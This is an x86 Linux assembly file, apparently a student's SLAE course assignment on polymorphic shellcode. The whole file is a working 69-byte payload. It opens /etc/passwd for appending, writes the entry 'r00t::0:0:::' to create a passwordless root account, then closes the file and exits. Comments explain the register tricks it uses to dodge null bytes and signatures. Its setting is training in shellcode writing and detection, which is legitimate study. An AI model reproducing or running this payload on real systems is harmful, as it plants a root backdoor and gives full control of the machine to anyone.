; Author :      Demey Alexandre (PA-14186)
; Date :        11-05-2020
; 
; Description : SLAE assignment #6 - Polymorphic shellcodes
;
; Size : 69 bytes

global _start
section .text

_start:

    xor     ebx, ebx
    mul     ebx			; EAX, EBX, EDX set to 0
    mov     al, 0x5		; open syscall number
    push    ebx			; string terminator
    push    0x64777373		
    push    0x61702f2f
    push    0x6374652f
    xchg    ebx, ecx		; ECX set to 0
    lea     ebx, [esp]		; EBX point to /etc/passwd
    mov     ch, 0x4		
    inc     ecx			; ECX => 0x401
    int     0x80

    xchg    eax, ebx		; Copy fd in EBX
    mov     eax, edx		; EAX set to 0
    push    eax			; String terminator
    xchg    al, ch		; EAX = 0x4 => write syscall number
    push    0x3a3a3a30
    push    0x3a303a3a
    push    0x74303072
    lea     ecx, [esp]		; ECX point to "r00t::0:0:::"
    mov     dl, 0xc		; string lengh
    int     0x80

    shr     eax, 1      	; write return number of bytes written (0xC) 
                        	; 0xC / 2 => 0x6 close syscall number
    int     0x80

    xchg    al, dh		; EAX set to 0
    inc     eax			; exit syscall number
    int     0x80
